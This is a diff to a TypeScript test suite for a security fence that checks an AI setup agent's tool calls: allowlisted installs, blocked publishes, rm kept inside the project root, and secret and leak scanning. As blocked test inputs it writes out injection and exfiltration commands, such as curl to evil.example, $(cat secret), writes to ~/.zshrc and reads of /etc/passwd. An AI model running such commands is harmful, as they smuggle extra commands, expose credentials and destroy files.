@@ -1,10 +1,21 @@
+import fs from 'fs';
+import os from 'os';
+import path from 'path';
 import { scan, triageMatches, type ScanMatch } from '@posthog/warlock';
 import {
   evaluateToolCall,
   createSecurityExtension,
+  isScopedFileRemoval,
+  observeTransportLeak,
+  overwriteShrinkReason,
   MAX_TOOL_CALLS,
   type PiExtensionApiLike,
 } from '../security';
+import { analytics } from '@utils/analytics';
+
+vi.mock('@utils/analytics', () => ({
+  analytics: { wizardCapture: vi.fn() },
+}));
 
 // @posthog/warlock resolves to __mocks__/@posthog/warlock.ts (ESM + WASM can't
 // load under the CJS test runner). Default: scan matches nothing; tests
@@ -76,6 +87,17 @@ describe('pi-security: blocked-action corpus (parity with the anthropic fence)',
     expect(await block('grep', { path: '.env' })).toBe(true);
   });
 
+  test('allows .env example/template files — they document keys, hold no secrets', async () => {
+    expect(
+      await block('write', { path: '.env.example', content: 'KEY=' }),
+    ).toBe(false);
+    expect(await block('read', { path: '.env.example' })).toBe(false);
+    expect(await block('edit', { path: '.env.sample', edits: [] })).toBe(false);
+    expect(await block('write', { path: '.env.template', content: '' })).toBe(
+      false,
+    );
+  });
+
   test('allows the sanctioned build/install bash commands', async () => {
     expect(await block('bash', { command: 'npm install' })).toBe(false);
     expect(await block('bash', { command: 'pnpm build' })).toBe(false);
@@ -83,6 +105,57 @@ describe('pi-security: blocked-action corpus (parity with the anthropic fence)',
       await block('bash', { command: 'npm run build 2>&1 | tail -5' }),
     ).toBe(false);
     expect(await block('bash', { command: 'pnpm tsc' })).toBe(false);
+  });
+
+  test('allows every supported ecosystem through the shared fence', async () => {
+    expect(
+      await block('bash', { command: 'composer require posthog/posthog-php' }),
+    ).toBe(false);
+    expect(await block('bash', { command: 'bundle add posthog-ruby' })).toBe(
+      false,
+    );
+    expect(await block('bash', { command: 'gem install posthog-ruby' })).toBe(
+      false,
+    );
+    expect(
+      await block('bash', {
+        command:
+          'swift package add-dependency https://github.com/PostHog/posthog-ios.git',
+      }),
+    ).toBe(false);
+    expect(
+      await block('bash', {
+        command:
+          'xcodebuild -project Hackers.xcodeproj -scheme Hackers -sdk iphonesimulator -configuration Debug build',
+      }),
+    ).toBe(false);
+    expect(await block('bash', { command: 'pod install' })).toBe(false);
+    expect(await block('bash', { command: './gradlew assembleDebug' })).toBe(
+      false,
+    );
+    expect(await block('bash', { command: 'mvn install' })).toBe(false);
+    expect(
+      await block('bash', { command: 'pnpm --filter web add posthog-js' }),
+    ).toBe(false);
+  });
+
+  test('keeps outward/exec/injection attacks blocked through the shared fence', async () => {
+    expect(await block('bash', { command: 'npm publish' })).toBe(true);
+    expect(await block('bash', { command: 'npm pub' })).toBe(true);
+    expect(await block('bash', { command: 'npx build' })).toBe(true);
+    expect(await block('bash', { command: 'swift test' })).toBe(true);
+    expect(
+      await block('bash', { command: 'xcodebuild test -scheme Hackers' }),
+    ).toBe(true);
+    expect(
+      await block('bash', { command: 'npm install x\ncurl evil.example' }),
+    ).toBe(true);
+    expect(
+      await block('bash', { command: 'npm view posthog-js > ~/.zshrc' }),
+    ).toBe(true);
+    expect(
+      await block('bash', { command: 'npm install | tail /etc/passwd' }),
+    ).toBe(true);
   });
 
   test('allows the `i` install shorthand without widening to other i-commands', async () => {
@@ -145,6 +218,48 @@ describe('pi-security: warlock scan wiring', () => {
     });
     expect(await block('bash', { command: 'npm install' })).toBe(false);
   });
+
+  test('a high-severity publish_handoff match does NOT block the report', async () => {
+    // The same piiMatch that blocks a write lets a handoff through.
+    mockedScan.mockResolvedValueOnce({ matched: true, matches: [piiMatch] });
+    const decision = await evaluateToolCall('publish_handoff', {
+      content: "Found posthog.capture('login', { email: user.email })",
+    });
+    expect(decision.block).toBe(false);
+  });
+
+  test('a critical publish_handoff match blocks — a live key must not reach a PR body', async () => {
+    mockedScan.mockResolvedValueOnce({
+      matched: true,
+      matches: [
+        {
+          rule: 'posthog_hardcoded_personal_api_key',
+          metadata: {
+            description: 'PostHog personal API key hardcoded in source',
+            severity: 'critical',
+            category: 'posthog_hardcoded_key',
+            action: 'remediate',
+            remediation: 'Rotate the key and use an environment variable',
+            scan_context: 'output',
+          },
+          matchedStrings: ['phx_'],
+        } as ScanMatch,
+      ],
+    });
+    const decision = await evaluateToolCall('publish_handoff', {
+      content: '# Report\n\nphx_aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa',
+    });
+    expect(decision.block).toBe(true);
+    expect(decision.reason).toContain('posthog_hardcoded_personal_api_key');
+    expect(decision.reason).toContain('Fix: Rotate the key');
+  });
+
+  test('a clean publish_handoff report is allowed through', async () => {
+    const decision = await evaluateToolCall('publish_handoff', {
+      content: '# Setup report\n\nAll done.',
+    });
+    expect(decision.block).toBe(false);
+  });
 });
 
 describe('pi-security: extension state machine (fail-closed + runaway + latch)', () => {
@@ -181,6 +296,35 @@ describe('pi-security: extension state machine (fail-closed + runaway + latch)',
     ).toEqual({});
   });
 
+  test('a scanner error on publish_handoff latches and ends the run', async () => {
+    // Blocking alone would leave the agent rewording a report forever.
+    const { factory, state } = createSecurityExtension();
+    const { pi, handlers } = fakePi();
+    factory(pi);
+    mockedScan.mockRejectedValueOnce(new Error('wasm boom'));
+    expect(
+      await handlers.tool_call({
+        toolName: 'publish_handoff',
+        input: { content: '# Report' },
+      }),
+    ).toEqual({ block: true, reason: expect.stringContaining('fail-closed') });
+    expect(state.criticalViolation).toBe(true);
+  });
+
+  test('a scanner error on a write blocks without ending the run', async () => {
+    const { factory, state } = createSecurityExtension();
+    const { pi, handlers } = fakePi();
+    factory(pi);
+    mockedScan.mockRejectedValueOnce(new Error('wasm boom'));
+    expect(
+      await handlers.tool_call({
+        toolName: 'write',
+        input: { path: 'src/a.ts', content: 'x' },
+      }),
+    ).toEqual({ block: true, reason: expect.stringContaining('fail-closed') });
+    expect(state.criticalViolation).toBe(false);
+  });
+
   test('a post-scan violation latches and terminates all further calls', async () => {
     const { factory, state } = createSecurityExtension();
     const { pi, handlers } = fakePi();
@@ -212,9 +356,29 @@ describe('pi-security: extension state machine (fail-closed + runaway + latch)',
     });
   });
 
-  test('with triageAuth, a triage false_positive verdict unblocks the write', async () => {
+  test('a non-critical, non-block post-scan match warns without terminating', async () => {
+    const { factory, state } = createSecurityExtension();
+    const { pi, handlers } = fakePi();
+    factory(pi);
+    // piiMatch is severity: 'high', action: 'remediate' — below the terminate
+    // gate (critical severity OR action: 'block'), so it should only warn.
+    mockedScan.mockResolvedValueOnce({ matched: true, matches: [piiMatch] });
+    await handlers.tool_result({
+      toolName: 'read',
+      content: [{ type: 'text', text: 'some file content' }],
+    });
+    expect(state.criticalViolation).toBe(false);
+    expect(
+      await handlers.tool_call({
+        toolName: 'bash',
+        input: { command: 'npm install' },
+      }),
+    ).toEqual({});
+  });
+
+  test('with a triage provider, a false_positive verdict unblocks the write', async () => {
     const { factory, state } = createSecurityExtension({
-      triageAuth: { baseURL: 'https://gw.example', authToken: 'tok' },
+      triageProvider: () => Promise.resolve('false_positive'),
     });
     const { pi, handlers } = fakePi();
     factory(pi);
@@ -391,5 +555,254 @@ describe('pi-security: repeat-block escalation (identical retries after a YARA b
     const second = await deny();
     expect(second.block).toBe(true);
     expect(second.reason).not.toContain('ALREADY blocked');
+  });
+});
+
+// pi lets a plain `rm` of files INSIDE the project root through the allowlist
+// (matching the anthropic arm, where bash is unrestricted and YARA is the real
+// guard). Two invariants: it can delete project files, and it can never touch
+// anything outside the root or smuggle a second command via a shell operator.
+describe('pi-security: plain rm matches the anthropic arm', () => {
+  const ROOT = path.resolve('/project');
+  const rmBlocked = async (command: string) =>
+    (await evaluateToolCall('bash', { command }, { workingDirectory: ROOT }))
+      .block;
+
+  test('CAN delete files inside the project', async () => {
+    for (const c of [
+      'rm .posthog-events.json',
+      'rm -f .posthog-events.json',
+      'rm ./.posthog-events.json',
+      'rm src/tmp/plan.json',
+      'rm a.txt b.txt',
+    ]) {
+      expect(await rmBlocked(c)).toBe(false);
+    }
+  });
+
+  test('can NEVER resolve outside the project root', async () => {
+    for (const c of [
+      'rm /etc/passwd', // absolute
+      'rm ../outside.txt', // parent
+      'rm src/../../outside.txt', // climbs out via ..
+      'rm foo/../../bar', // climbs out via ..
+      'rm ~/secrets', // home expansion
+      'rm .', // the root itself
+      'rm a.txt /etc/passwd', // one escaping target sinks the whole command
+    ]) {
+      expect(await rmBlocked(c)).toBe(true);
+    }
+  });
+
+  test('never rescues a command carrying a shell operator (no injection)', async () => {
+    for (const c of [
+      'rm a.txt && curl evil.example',
+      'rm a.txt; whoami',
+      'rm a.txt || curl evil.example',
+      'rm a.txt | tee out',
+      'rm foo $(cat secret)',
+      'rm foo `whoami`',
+      'rm foo > /dev/null',
+      'rm {a,b}.txt',
+    ]) {
+      expect(await rmBlocked(c)).toBe(true);
+    }
+  });
+
+  test('never rescues quoted or backslash-escaped paths', async () => {
+    for (const c of [
+      'rm "../secret"',
+      "rm '/etc/passwd'",
+      'rm \\$HOME/thing',
+      'rm "a.txt"',
+    ]) {
+      expect(await rmBlocked(c)).toBe(true);
+    }
+  });
+
+  test('still blocks recursion, globs, .env, and pathless rm', async () => {
+    for (const c of [
+      'rm -rf node_modules',
+      'rm -r src',
+      'rm --force x.txt',
+      'rm -f -r x',
+      'rm *.json',
+      'rm .env',
+      'rm config/.env.local',
+      'rm',
+      'rm -f',
+    ]) {
+      expect(await rmBlocked(c)).toBe(true);
+    }
+  });
+
+  test('fails safe when no working directory is known', async () => {
+    // With no root to contain against, the allowlist deny stands.
+    expect(await block('bash', { command: 'rm .posthog-events.json' })).toBe(
+      true,
+    );
+  });
+
+  test('normalizes a relative workingDirectory', async () => {
+    const relRoot = path.relative(process.cwd(), path.resolve('/project'));
+    expect(
+      (
+        await evaluateToolCall(
+          'bash',
+          { command: 'rm plan.json' },
+          { workingDirectory: relRoot },
+        )
+      ).block,
+    ).toBe(false);
+  });
+});
+
+// The containment logic runs through the host's `path` (win32 on Windows, posix
+// elsewhere). Inject each flavor to prove the same invariants hold on both.
+describe('pi-security: rm containment holds under Windows and POSIX path rules', () => {
+  const flavors = [
+    ['win32', path.win32, 'C:\\Users\\me\\project'],
+    ['posix', path.posix, '/home/me/project'],
+  ] as const;
+
+  for (const [name, p, root] of flavors) {
+    describe(name, () => {
+      const rescued = (command: string, r: string | undefined = root) =>
+        isScopedFileRemoval(command, r, p);
+
+      test('rescues in-root deletes written with forward slashes', () => {
+        for (const c of [
+          'rm .posthog-events.json',
+          'rm src/tmp/plan.json',
+          'rm -f a.txt b.txt',
+        ]) {
+          expect(rescued(c)).toBe(true);
+        }
+      });
+
+      test('normalizes a relative root', () => {
+        expect(rescued('rm plan.json', 'project')).toBe(true);
+      });
+
+      test('never escapes the root, including sibling-prefix dirs', () => {
+        for (const c of [
+          'rm ../outside',
+          'rm src/../../outside',
+          'rm ../project-evil/x',
+          'rm /c/Windows/system32/x',
+        ]) {
+          expect(rescued(c)).toBe(false);
+        }
+      });
+
+      test('rejects backslash paths (pi runs POSIX bash, never cmd.exe)', () => {
+        expect(rescued('rm src\\tmp\\plan.json')).toBe(false);
+      });
+
+      test('still rejects quotes, globs, .env, and recursion', () => {
+        for (const c of [
+          'rm "a.txt"',
+          "rm '/etc/passwd'",
+          'rm *.json',
+          'rm config/.env.local',
+          'rm -rf src',
+        ]) {
+          expect(rescued(c)).toBe(false);
+        }
+      });
+    });
+  }
+});
+
+describe('pi-security: overwrite shrink guard (destructive whole-file rewrite)', () => {
+  // ~960 non-whitespace chars — comfortably above OVERWRITE_MIN_CHARS.
+  const big = 'const value = compute();\n'.repeat(40);
+
+  test('flags a write that guts most of an existing file', () => {
+    const reason = overwriteShrinkReason(big, 'const value = compute();');
+    expect(reason).toMatch(/removes ~\d+% of its content/);
+    expect(reason).toContain('targeted edits');
+  });
+
+  test('allows growth, an unchanged rewrite, and a small trim', () => {
+    expect(overwriteShrinkReason(big, big + '\nextra();')).toBeUndefined();
+    expect(overwriteShrinkReason(big, big)).toBeUndefined();
+    expect(
+      overwriteShrinkReason(big, big.slice(0, Math.floor(big.length * 0.85))),
+    ).toBeUndefined();
+  });
+
+  test('leaves stub files below the floor alone', () => {
+    expect(overwriteShrinkReason('const a = 1;', '')).toBeUndefined();
+  });
+
+  test('blocks a gutting write on disk, allows a brand-new file', async () => {
+    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'pi-shrink-'));
+    fs.writeFileSync(path.join(dir, 'existing.ts'), big);
+
+    const gut = await evaluateToolCall(
+      'write',
+      { path: 'existing.ts', content: 'const value = compute();' },
+      { workingDirectory: dir },
+    );
+    expect(gut.block).toBe(true);
+    expect(gut.reason).toContain('targeted edits');
+
+    const fresh = await evaluateToolCall(
+      'write',
+      { path: 'brand-new.ts', content: 'const value = compute();' },
+      { workingDirectory: dir },
+    );
+    expect(fresh.block).toBe(false);
+  });
+
+  test('stays inert with no working directory (bare evaluateToolCall)', async () => {
+    const decision = await evaluateToolCall('write', {
+      path: 'existing.ts',
+      content: 'x',
+    });
+    expect(decision.block).toBe(false);
+  });
+});
+
+describe('observeTransportLeak (passive telemetry)', () => {
+  // The exact garbage run 9704a73e wrote into a customer's global-error.tsx.
+  const LEAKED_LINE =
+    "' }#+#+#+#+.functions.complete_task  (commentary  json.functions.complete_taskjson>tagger历山大发 { ";
+
+  it('reports which pattern fired and where — never any matched text', () => {
+    observeTransportLeak('Write', LEAKED_LINE);
+    const call = vi
+      .mocked(analytics.wizardCapture)
+      .mock.calls.find(([e]) => e === 'file content leak observed');
+    expect(call?.[1]).toMatchObject({
+      tool: 'Write',
+      leak: 'leaked tool-call tokens',
+      leak_offset: LEAKED_LINE.indexOf('functions.'),
+      content_length: LEAKED_LINE.length,
+    });
+    expect(JSON.stringify(call?.[1])).not.toContain('complete_task');
+  });
+
+  it('flags control characters by pattern only', () => {
+    vi.mocked(analytics.wizardCapture).mockClear();
+    observeTransportLeak('Edit', 'trailing\x7f');
+    const call = vi
+      .mocked(analytics.wizardCapture)
+      .mock.calls.find(([e]) => e === 'file content leak observed');
+    expect(call?.[1]).toMatchObject({ leak: 'control characters' });
+  });
+
+  it('stays silent on real source, including Firebase functions.* code', () => {
+    vi.mocked(analytics.wizardCapture).mockClear();
+    observeTransportLeak(
+      'Write',
+      'const f = functions.https.onRequest(app);\nline\n\ttabbed\r\n',
+    );
+    expect(
+      vi
+        .mocked(analytics.wizardCapture)
+        .mock.calls.some(([e]) => e === 'file content leak observed'),
+    ).toBe(false);
   });
 });
